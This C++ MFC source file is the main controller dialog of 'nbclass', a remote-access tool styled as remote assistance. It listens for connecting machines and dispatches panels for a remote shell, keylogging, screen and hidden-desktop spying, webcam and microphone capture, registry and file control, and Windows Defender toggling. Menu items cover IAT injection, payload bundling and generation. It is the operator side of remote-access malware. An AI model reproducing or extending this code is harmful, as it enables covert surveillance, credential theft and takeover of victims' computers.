#include "pch.h"
#include "framework.h"
#include "nbclass.h"
#include "nbclassDlg.h"
#include "afxdialogex.h"
#include"CSetingDlg.h"
#include"CShelldlg.h"
#include"CBzDlg.h"
#include"CSystemDlg.h"
#include"CServerManager.h"
#include"CRegDlg.h"
#include"CFileDlg.h"
#include"CScreenSpyDlg.h"
#include"CSpeakerDlg.h"
#include"CAudioDlg.h"
#include"CVideoDlg.h"
#include"CSysinfo.h"
#include"CTaskDlg.h"
#include"CGenerate.h"
#include"CKeyboard.h"
#include"CDesktopDlg.h"
#include"CTools.h"
#include"CShowCommand.h"
#include"COLDSCREENSPY.h"
#include"shellcode.h"
#include"../../struct/info.h"
#include"../../common/macros.h"
#include"CBundleDlg.h"
#include"CInjection.h"
#include"CLOGIN.h"
#include"check.h"
#include"Sortthelist.h"
#ifdef _DEBUG

#else
#include"VMProtectSDK.h"
#endif
CnbclassDlg* g_pCnbclassDlg = NULL;   //声明全局变量
CIOCPServer* m_iocpServer = NULL;

typedef struct
{
	char* title;
	int		nWidth;
}COLUMNSTRUCT;

COLUMNSTRUCT g_Log_Data[] =
{
	{_T("类型"),			30	},
	{_T("时间"),			60	},
	{_T("事件"),			130	}
};

//总宽度
int g_Log_Width = 0;
//条目个数
int	g_Log_Count = (sizeof(g_Log_Data) / 8);

COLUMNSTRUCT g_Column_Data[] =
{
	{_T("外网-IP"),			120	},
	{_T("内网-IP"),			110	},
	{_T("系统"),			100	},
	{_T("主机名"),			160	},
	{_T("用户名"),			130	},
	{_T("地理位置"),		150	},
	{_T("CPU"),				150	},
	{_T("内存"),			65  },
	{_T("硬盘"),			65  },
	{_T("延迟"),			45	},
	{_T("视频"),		   	40	},
	{_T("备注"),		  	80},
	{_T("安装日期"),		  	120},
	{_T("杀毒"),		160	},
	{_T("Context"),		0	}
};
//总宽度
int g_Column_Width = 0;
//条目个数
int	g_Column_Count = (sizeof(g_Column_Data) / 8);


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
public:
	
	CString VerInfo;
	virtual BOOL OnInitDialog();
	afx_msg void OnBnClickedButton1();
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
, VerInfo(_T(""))
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT1, VerInfo);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
	
	ON_BN_CLICKED(IDC_BUTTON1, &CAboutDlg::OnBnClickedButton1)
END_MESSAGE_MAP()


// CnbclassDlg 对话框

CnbclassDlg::CnbclassDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_NBCLASS_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CnbclassDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_CONNECTVIEW, m_ConnectList);
	DDX_Control(pDX, IDC_LOGVIEW, m_LogList);

}

BEGIN_MESSAGE_MAP(CnbclassDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_NOTIFY(NM_RCLICK, IDC_LOGVIEW, &CnbclassDlg::OnNMRClickLogview)
	ON_NOTIFY(NM_RCLICK, IDC_CONNECTVIEW, &CnbclassDlg::OnNMRClickConnectview)
	ON_COMMAND(ID_LOG_32775, &CnbclassDlg::OnLogClear)
	ON_COMMAND(ID_LOG_32776, &CnbclassDlg::OnLogDeleteSelect)
	ON_COMMAND(ID_SETPORT, &CnbclassDlg::OnSetConfig)
	ON_MESSAGE(WM_ADDTOLIST, &CnbclassDlg::OnAddtolist)
	ON_COMMAND(ID_CONNECT_32781, &CnbclassDlg::OnShell)
	ON_MESSAGE(WM_OPENSHELLDIALOG, &CnbclassDlg::OnOpenshelldialog)
	ON_COMMAND(ID_CONNECT_32782, &CnbclassDlg::OnConnectBeiZhu)
	ON_COMMAND(ID_32789, &CnbclassDlg::OnRemove)
	ON_MESSAGE(WM_REMOVEFROMLIST, &CnbclassDlg::OnRemovefromlist)
	ON_COMMAND(ID_CONNECT_32784, &CnbclassDlg::OnSystem)
	ON_MESSAGE(WM_OPENPSLISTDIALOG, &CnbclassDlg::OnOpenpslistdialog)
	ON_MESSAGE(WM_OPENPSERLISTDIALOG, &CnbclassDlg::OnOpenpserlistdialog)
	ON_COMMAND(ID_CONNECT_32785, &CnbclassDlg::OnServer)
	ON_MESSAGE(WM_OPENREGEDITDIALOG, &CnbclassDlg::OnOpenregeditdialog)
	ON_MESSAGE(WM_OPENMANAGERDIALOG, &CnbclassDlg::OnOpenmanagerdialog)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, &CnbclassDlg::OnOnopenscreenspydialog)
	ON_COMMAND(ID_32848, &CnbclassDlg::OnSoundPut)
	ON_COMMAND(ID_32849, &CnbclassDlg::OnSoundPop)
	ON_MESSAGE(WM_OPENSPEAKERDIALOG, &CnbclassDlg::OnOpenspeakerdialog)
	ON_MESSAGE(WM_OPENAUDIODIALOG, &CnbclassDlg::OnOpenaudiodialog)
	ON_COMMAND(ID_CONNECT_32779, &CnbclassDlg::OnConnectVideo)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, &CnbclassDlg::OnOpenwebcamdialog)
	ON_COMMAND(ID_CONNECT_32850, &CnbclassDlg::OnSysInfo)
	ON_MESSAGE(WM_OPENSYSINFODIALOG, &CnbclassDlg::OnOpensysinfodialog)
	ON_COMMAND(ID_32788, &CnbclassDlg::OnScreenshots)
	ON_COMMAND(ID_CONNECT_32815, &CnbclassDlg::OnTask)
	ON_MESSAGE(WM_OPENTASKDIALOG, &CnbclassDlg::OnOpentaskdialog)
	ON_COMMAND(ID_CONNECT_32778, &CnbclassDlg::OnLookSpy)
	ON_COMMAND(ID_CONNECT_32787, &CnbclassDlg::OnReg)
	ON_COMMAND(ID_CONNECT_32777, &CnbclassDlg::OnFile)
	ON_COMMAND(ID_32790, &CnbclassDlg::OnShutdown)
	ON_COMMAND(ID_32791, &CnbclassDlg::OnReboot)
	ON_COMMAND(ID_32792, &CnbclassDlg::OnLogoff)
	ON_COMMAND(ID_Generate, &CnbclassDlg::OnGenerate)
	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, &CnbclassDlg::OnOpenkeyboarddialog)
	ON_COMMAND(ID_CONNECT_32863, &CnbclassDlg::OnConnectKey)
	ON_COMMAND(ID_32864, &CnbclassDlg::OnFileBundle)
	ON_COMMAND(ID_CONNECT_32865, &CnbclassDlg::OnDesktop)
	ON_MESSAGE(WM_OPENDESKTOPSPYDIALOG, &CnbclassDlg::OnOpendesktopspydialog)
	ON_MESSAGE(WM_TOOLSCLASS, &CnbclassDlg::OnToolsclass)
	ON_MESSAGE(WM_NOTIFY_MAIN, &CnbclassDlg::OnNotifyMain)
	ON_COMMAND(ID_TUOPAN_32866, &CnbclassDlg::OnTuopanExit)
	ON_WM_CLOSE()
	ON_WM_CTLCOLOR()
	ON_COMMAND(ID_32868, &CnbclassDlg::Onabout)
	ON_COMMAND(ID_32867, &CnbclassDlg::OnShowCommand)
	ON_COMMAND(ID_32870, &CnbclassDlg::OnOpenTask)
	ON_COMMAND(ID_32871, &CnbclassDlg::OnDelTask)
	ON_COMMAND(ID_WINDOWSDEFENDER_32873, &CnbclassDlg::OnOpenDef)
	ON_COMMAND(ID_WINDOWSDEFENDER_32874, &CnbclassDlg::OnCloseDef)

	ON_COMMAND(ID_32878, &CnbclassDlg::OnIATinjection)
	ON_NOTIFY(LVN_COLUMNCLICK, IDC_CONNECTVIEW, &CnbclassDlg::OnLvnColumnclickConnectview)
	ON_COMMAND(ID_CONNECT_32879, &CnbclassDlg::OnConnectOldSrc)
	ON_MESSAGE(WM_OPENOLDSCREENSPYDIALOG, &CnbclassDlg::OnOpenoldscreenspydialog)
	ON_COMMAND(ID_32880, &CnbclassDlg::OnUpdateClient)
END_MESSAGE_MAP()


// CnbclassDlg 消息处理程序

BOOL CnbclassDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();
/*
#ifdef _DEBUG

#else
	VMProtectBegin("ppp");
	char Hwid[256] = { 0 };
	char key[1024] = { 0 };
	CLOGIN LogDlg;
	CString aaaaa;
	//获取机器吗
	int size = VMProtectGetCurrentHWID(0, 0);
	VMProtectGetCurrentHWID(Hwid, size);
	int res = 1;
	//读取key
	HANDLE	hFile = CreateFileA("bhyy.key", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		DWORD lpNumberOfBytesRead;
		DWORD Filesize = GetFileSize(hFile, 0);
		ReadFile(hFile, key, Filesize,&lpNumberOfBytesRead,0);
		CloseHandle(hFile);
		res = VMProtectSetSerialNumber(key);
		if (res)
		{
			//设置PE结构
			PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)GetModuleHandleA(0);
			PIMAGE_FILE_HEADER pPeHeader = (PIMAGE_FILE_HEADER)((DWORD_PTR)pDosHeader + 4 + pDosHeader->e_lfanew);
			PIMAGE_OPTIONAL_HEADER32 OpHeader32 = (PIMAGE_OPTIONAL_HEADER32)((DWORD_PTR)pPeHeader + IMAGE_SIZEOF_FILE_HEADER);
			DWORD oLD;
			VirtualProtect(pDosHeader, OpHeader32->SizeOfImage, 0x40, &oLD);
			RtlZeroMemory(pDosHeader, OpHeader32->SizeOfImage);
		}

	}
	else
	{
		LogDlg.m_Mhwid = Hwid;
		if (LogDlg.DoModal() != IDOK)
			exit(0);
		res = VMProtectSetSerialNumber(LogDlg.m_key.GetBuffer());
		if (res)
		{
			//设置PE结构
			PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)GetModuleHandleA(0);
			PIMAGE_FILE_HEADER pPeHeader = (PIMAGE_FILE_HEADER)((DWORD_PTR)pDosHeader + 4 + pDosHeader->e_lfanew);
			PIMAGE_OPTIONAL_HEADER32 OpHeader32 = (PIMAGE_OPTIONAL_HEADER32)((DWORD_PTR)pPeHeader + IMAGE_SIZEOF_FILE_HEADER);
			DWORD oLD;
			VirtualProtect(pDosHeader, OpHeader32->SizeOfImage, 0x40, &oLD);
			RtlZeroMemory(pDosHeader, OpHeader32->SizeOfImage);
		}
		CFile file("bhyy.key", CFile::modeCreate | CFile::modeWrite);
		file.Write(LogDlg.m_key.GetBuffer(), LogDlg.m_key.GetLength());
	}
#endif // _DEBUG
	CAboutDlg dlg;
	if (dlg.DoModal() != IDOK)
		exit(0);

#ifdef _DEBUG

#else

	//CheckingApplication((PBYTE)GetModuleHandleA(0));
	VMProtectEnd();
#endif // _DEBUG
*/
	//透明度
	
	SetWindowLong(m_hWnd, GWL_EXSTYLE, GetWindowLong(m_hWnd, GWL_EXSTYLE) | WS_EX_LAYERED);
	SetLayeredWindowAttributes(0, ((CnbclassApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "透明度", 220), LWA_ALPHA); // 120是透明度，范围是0～255

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	g_pCnbclassDlg = this;

	// 如果纯真ip库存在就初始化
	if (((CnbclassApp*)AfxGetApp())->m_bIsQQwryExist)	
	{
		m_QQwry = new SEU_QQwry;
		m_QQwry->SetPath("QQWry.Dat");
	}
	// TODO: 在此添加额外的初始化代码
	InitView();

	m_Menu.LoadMenu(IDR_MAIN);
	SetMenu(&m_Menu);

	/*
	//禁用主菜单某一项
	CMenu* pM = m_Menu.GetSubMenu(1);
	pM->EnableMenuItem(2, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          
	//pM->EnableMenuItem(3, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          
       */   

	CreateThread(0,0,(LPTHREAD_START_ROUTINE)isTitleName,this,0,0);

	//让视图刷新自动对齐
	CRect rect;
	GetWindowRect(&rect);
	rect.bottom += 20;
	MoveWindow(rect);

	ShowLog("初始化", "请合理使用本程序，因为本程序所造成的任何法律责任作者不予承担", LIST_IMG_INDEX_INIT);
	
	//根据配置文件设置监听端口
	int	nPort = 80;
	int nMaxConnection = 10000;
	if (((CnbclassApp*)AfxGetApp())->m_iniFile)
	{
		//开始监听
		nPort = ((CnbclassApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort");								//读取ini 文件中的监听端口
		nMaxConnection = ((CnbclassApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnection");   //读取最大连接数
	}
	else
	{
		((CnbclassApp*)AfxGetApp())->m_IniFile.SetInt("Settings", "ListenPort", nPort);      //向ini文件中写入值
		((CnbclassApp*)AfxGetApp())->m_IniFile.SetInt("Settings", "MaxConnection", nMaxConnection);
	}

	Activate(nPort, nMaxConnection);             //开始监听

	nid.cbSize = (DWORD)sizeof(NOTIFYICONDATA);
	nid.hWnd = this->m_hWnd;
	nid.uID = IDR_MAINFRAME;
	nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
	nid.uCallbackMessage = WM_NOTIFY_MAIN;//自定义的消息名称
	nid.hIcon = m_hIcon;
	strcpy(nid.szTip, _T("nbclass远程协助"));//信息提示条
	Shell_NotifyIcon(NIM_ADD, &nid);//添加图标到系统状态区域

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}
DWORD CnbclassDlg::isTitleName(CnbclassDlg* windows)
{
	Sleep(30000);
	//检查标题
	CString Title;
	windows->GetWindowTextA(Title);
	if (Title.GetLength() == 0xF && Title.Find("nbclass Ver") != -1)
		windows->WindowsTitle = 1;
	else
		windows->WindowsTitle = 0;
	return 1;
}
void CnbclassDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CnbclassDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CnbclassDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

/// <summary>
/// 回调函数
/// </summary>
/// <param name="lpParam"></param>
/// <param name="pContext"></param>
/// <param name="nCode"></param>
void CALLBACK CnbclassDlg::NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode)
{
	try
	{
		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			g_pCnbclassDlg->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			ProcessReceive(pContext);
			break;
		case NC_RECEIVE_COMPLETE:
			ProcessReceiveComplete(pContext);
			break;
		}
	}
	catch (...) {}
}

/// <summary>
/// 处理接收完成的请求
/// </summary>
/// <param name="pContext"></param>
void CnbclassDlg::ProcessReceiveComplete(ClientContext* pContext)
{
	if (pContext == NULL)
		return;

	if (!g_pCnbclassDlg->WindowsTitle)
		return;
	// 如果管理对话框打开，交给相应的对话框处理
	CDialog* dlg = (CDialog*)pContext->m_Dialog[1];

	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{		
			case SHELL_DLG:							//远程终端
				((CShellDlg*)dlg)->OnReceiveComplete();
				break;
			case SYSTEM_DLG:						//系统管理
				((CSystemDlg*)dlg)->OnReceiveComplete();
				break;
			case SERMANAGER_DLG:				//服务管理
				((CServerManager*)dlg)->OnReceiveComplete();
				break;
			case REGEDIT_DLG:						//注册表
				((CRegDlg*)dlg)->OnReceiveComplete();
				break;
			case FILEMANAGER_DLG:						//文件管理
				((CFileDlg*)dlg)->OnReceiveComplete();
				break;
			case SCREENSPY_DLG:						//屏幕监控
				((CScreenSpyDlg*)dlg)->OnReceiveComplete();
				break;
			case SPEAKER_DLG:
				((CSpeakerDlg*)dlg)->OnReceiveComplete();
				break;
			case AUDIO_DLG:
				((CAudioDlg*)dlg)->OnReceiveComplete();
				break;
			case WEBCAM_DLG:
				((CVideoDlg*)dlg)->OnReceiveComplete();
				break;
			case SYSINFO_DLG:
				((CSysinfo*)dlg)->OnReceiveComplete();
				break;
			case TASK_DLG:
				((CTaskDlg*)dlg)->OnReceiveComplete();
				break;
			case KEYBOARD_DLG:
				((CKeyboard*)dlg)->OnReceiveComplete();
				break;
			case DESKTOP_DLG:
				((CDesktopDlg*)dlg)->OnReceiveComplete();
				break;	
			case TOOLS_DLG:
				((CTools*)dlg)->OnReceiveComplete();
				break;
			case OLDSCREENSPY_DLG:					//旧屏幕
				((COLDSCREENSPY*)dlg)->OnReceiveComplete();
				break;
			default:
				break;
		}
		return;
	}
	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_AUTH: // 要求验证
	{
		CString		m_PassWord = "password";
		m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		break;
	}
	case TOKEN_HEARTBEAT: // 回复心跳包
	{
		BYTE	bToken = COMMAND_ACTIVED;
		m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		break;
	}
	case TOKEN_LOGIN: // 上线包
	{
		pContext->m_bIsMainSocket = true;
		g_pCnbclassDlg->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
		break;
	}
	case TOKEN_SHELL_START:				//终端管理
		g_pCnbclassDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PSLIST:							//系统管理
		g_pCnbclassDlg->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SSLIST:							// 服务管理
		g_pCnbclassDlg->PostMessage(WM_OPENPSERLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_REGEDIT:					//注册表管理    
		g_pCnbclassDlg->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_DRIVE_LIST:					//文件管理
		g_pCnbclassDlg->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO:				// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
		g_pCnbclassDlg->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_DESKTOP:				//后台桌面
		g_pCnbclassDlg->PostMessage(WM_OPENDESKTOPSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SPEAK_START: // 扬声器
		g_pCnbclassDlg->PostMessage(WM_OPENSPEAKERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_AUDIO_START: // 语音
		g_pCnbclassDlg->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
		g_pCnbclassDlg->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SYSINFOLIST:				//主机管理
		g_pCnbclassDlg->PostMessage(WM_OPENSYSINFODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_TASKLIST:				//计划任务窗口
		g_pCnbclassDlg->PostMessage(WM_OPENTASKDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START:
		g_pCnbclassDlg->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_TOOLS:				//实用功能
		g_pCnbclassDlg->PostMessage(WM_TOOLSCLASS, 0, (LPARAM)pContext);
		break;
	case TOKEN_OLDBITMAPINFO:		//实用功能
		g_pCnbclassDlg->PostMessage(WM_OPENOLDSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	default:
		closesocket(pContext->m_Socket);
		break;
	}


	

}
/// <summary>
/// 处理未接收完成的请求
/// </summary>
/// <param name="pContext"></param>
void CnbclassDlg::ProcessReceive(ClientContext* pContext)
{
	if (pContext == NULL)
		return;

	if (!g_pCnbclassDlg->WindowsTitle)
		return;

	// 如果管理对话框打开，交给相应的对话框处理
	CDialog* dlg = (CDialog*)pContext->m_Dialog[1];

	// 交给窗口处理
	if (dlg == NULL)
	{
		return;
	}
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case SCREENSPY_DLG:
			((CScreenSpyDlg*)dlg)->OnReceive();
			break;
		case DESKTOP_DLG:
			((CDesktopDlg*)dlg)->OnReceive();
			break;
		case OLDSCREENSPY_DLG:
			((COLDSCREENSPY*)dlg)->OnReceive();
			break;	
		default:
			break;
		}
		return;
	}

}
/// <summary>
/// 发送指令
/// </summary>
/// <param name="pData">数据</param>
/// <param name="nSize">长度</param>
void CnbclassDlg::SendSelectCommand(PBYTE pData, UINT nSize)
{
	if (m_ConnectList.GetSelectedCount() < 1)
	{
		return;
	}
	// TODO: Add your command handler code here
	POSITION pos = m_ConnectList.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	//遍历所有选中批量执行
	while (pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = m_ConnectList.GetNextSelectedItem(pos);
		CString con = m_ConnectList.GetItemText(nItem, CONNECT_CONTEXT);
		ClientContext* conn = (ClientContext*)atoi(con);
		//ClientContext* pContext = (ClientContext*)m_ConnectList.GetItemData(nItem);
		ClientContext* pContext = conn;
		// 发送获得驱动器列表数据包
		m_iocpServer->Send(pContext, pData, nSize);
		//Save the pointer to the new item in our CList
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memoryt	

}

/// <summary>
/// 监听端口
/// </summary>
/// <param name="nPort"></param>
/// <param name="nMaxConnections"></param>
void CnbclassDlg::Activate(UINT nPort, UINT nMaxConnections)
{
	//设置状态栏的端口信息
	char temp[50];
	sprintf(temp, "\t端口:%d", nPort);
	m_wndStatusBar.SetPaneText(1, temp);


	CString		str, strLogText;

	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;
	}



	m_iocpServer = new CIOCPServer;

	// 开启IPCP服务器
	if (m_iocpServer->Initialize(NotifyProc, this, nMaxConnections, nPort))
	{
		CString IP;
		char hostname[256];
		gethostname(hostname, sizeof(hostname));
		HOSTENT* host = gethostbyname(hostname);
		if (host != NULL)
			IP = inet_ntoa(*(IN_ADDR*)host->h_addr_list[0]);
		else
			IP = _T("127.0.0.1");
		ShowWindow(SW_SHOW);
		UpdateWindow();
		CString web;
		web.Format(_T("%s:%d"), IP, nPort);
		m_wndStatusBar.SetPaneText(0, web);
		strLogText.Format("%s   端口: [%d]", "欢迎使用 nbclass 远程协助工具 ", nPort);
		ShowLog("监听成功", strLogText, LIST_IMG_INDEX_SUCCESS);
	}
	else
	{
		str.Format(_T("端口 %d 监听失败"), nPort);
		ShowWindow(SW_SHOW);
		UpdateWindow();
		m_wndStatusBar.SetPaneText(0, str);
		strLogText.Format("%s   端口: [%d]", "欢迎使用 nbclass 远程协助工具", nPort);
		ShowLog("监听失败", strLogText, LIST_IMG_INDEX_ERROR);
	}

}
/// <summary>
/// 窗口大小改变触发
/// </summary>
/// <param name="nType"></param>
/// <param name="cx"></param>
/// <param name="cy"></param>
void CnbclassDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	double dcx = cx;     //对话框的总宽度

	if (SIZE_MINIMIZED == nType)
	{
		return;
	}

	//自动拉伸
	if (m_ConnectList.m_hWnd != NULL)
	{
		CRect rc;
		rc.left = 1;         //列表的左坐标
		rc.top = 1;         //列表的上坐标
		rc.right = cx - 1;     //列表的右坐标
		rc.bottom = cy - 160;  //列表的下坐标
		m_ConnectList.MoveWindow(rc);

		for (int i = 0; i < g_Column_Count; i++) {                   //遍历每一个列
			double dd = g_Column_Data[i].nWidth;     //得到当前列的宽度
			dd /= g_Column_Width;                    //看一看当前宽度占总长度的几分之几
			dd *= dcx;                                       //用原来的长度乘以所占的几分之几得到当前的宽度
			int lenth = dd;                                   //转换为int 类型
			m_ConnectList.SetColumnWidth(i, (lenth));        //设置当前的宽度
		}

	}
	if (m_LogList.m_hWnd != NULL)
	{
		CRect rc;
		rc.left = 1;        //列表的左坐标
		rc.top = cy - 156;    //列表的上坐标
		rc.right = cx - 1;    //列表的右坐标
		rc.bottom = cy - 20;  //列表的下坐标
		m_LogList.MoveWindow(rc);

		for (int i = 0; i < g_Log_Count; i++) {                   //遍历每一个列
			double dd = g_Log_Data[i].nWidth;     //得到当前列的宽度
			dd /= g_Log_Width;                    //看一看当前宽度占总长度的几分之几
			dd *= dcx;                                       //用原来的长度乘以所占的几分之几得到当前的宽度
			int lenth = dd;                                   //转换为int 类型
			m_LogList.SetColumnWidth(i, (lenth-5));        //设置当前的宽度
		}
	}
	if (m_wndStatusBar.m_hWnd != NULL) {    //当对话框大小改变时 状态条大小也随之改变
		CRect rc;
		rc.top = cy - 20;
		rc.left = 0;
		rc.right = cx;
		rc.bottom = cy;
		m_wndStatusBar.MoveWindow(rc);
		//m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_POPOUT, cx - 10);
	}

	// TODO: 在此处添加消息处理程序代码
}

/// <summary>
/// 初始化视图
/// </summary>
void CnbclassDlg::InitView()
{
	//设置可以显示图片索引
	HIMAGELIST hImageListSmall = NULL;
	Shell_GetImageLists(NULL, &hImageListSmall);
	ListView_SetImageList(m_LogList.m_hWnd, hImageListSmall, LVSIL_SMALL);

	//设置可以显示图片索引
	hImageListSmall = NULL;
	Shell_GetImageLists(NULL, &hImageListSmall);
	ListView_SetImageList(m_ConnectList.m_hWnd, hImageListSmall, LVSIL_SMALL);


	//设置连接视图LVS_EX_GRIDLINES
	m_ConnectList.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_INFOTIP | LVS_EX_GRIDLINES);
	for (int i = 0; i < g_Column_Count; i++)
	{
		m_ConnectList.InsertColumn(i, g_Column_Data[i].title, LVCFMT_CENTER, g_Column_Data[i].nWidth);
		g_Column_Width += g_Column_Data[i].nWidth;       //得到总宽度

	}

	//设置日志视图
	m_LogList.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
	for (int i = 0; i < g_Log_Count; i++)
	{
		m_LogList.InsertColumn(i, g_Log_Data[i].title, LVCFMT_LEFT, g_Log_Data[i].nWidth);
		g_Log_Width += g_Log_Data[i].nWidth;       //得到总宽度
	}

	//设置状态栏
	m_wndStatusBar.Create(this);
	//创建两个面板//第一个面板是1,第二个面板是2
	UINT nID[] = { 1,2,3,4 };
	m_wndStatusBar.SetIndicators(nID, 4);
	CRect rect = NULL;
	GetClientRect(&rect);
	//设置面板1信息 ,第一个面板,编号为1,正常显示,宽度为100
	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_NORMAL, 130);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL,100);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 850);
	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_STRETCH, 0);
	//设置状态栏位置
	CString str;
	m_wndStatusBar.MoveWindow(0, rect.bottom - 20, rect.right, 20);
	m_wndStatusBar.SetPaneText(0, "\t就绪，等待客户");
	m_wndStatusBar.SetPaneText(3, "\t连接: 0");
	str.Format(_T("\tWin7:[%d]  Win8:[%d]  Win10:[%d]  Win11:[%d]  Win2008:[%d]  Win2012:[%d]  Win2016:[%d]  Win2019:[%d]  未知:[%d]"),
		nOSCount[0],
		nOSCount[1],
		nOSCount[2],
		nOSCount[3],
		nOSCount[4],
		nOSCount[5],
		nOSCount[6],
		nOSCount[7],
		nOSCount[8]);
	m_wndStatusBar.SetPaneText(2, str);
}

/// <summary>
/// 打印日志
/// </summary>
/// <param name="success">状态</param>
/// <param name="Text">文本</param>
void CnbclassDlg::ShowLog(LPCTSTR type, LPCTSTR Text,int imgIndex)
{
	if (!WindowsTitle)
		return;

	//15 电脑图标
	// TODO: 在此处添加实现代码.
	char m_Text[512] = { 0 };
	CTime time = CTime::GetCurrentTime();		//构造CTime对象 
	CString strTime = time.Format("[%Y-%m-%d %H:%M:%S]");
	m_LogList.InsertItem(0, type, imgIndex);//图片
	m_LogList.SetItemText(0, 1, strTime);  
	m_LogList.SetItemText(0, 2, Text);  

}


/// <summary>
/// 日志列表单击弹菜单
/// </summary>
/// <param name="pNMHDR"></param>
/// <param name="pResult"></param>
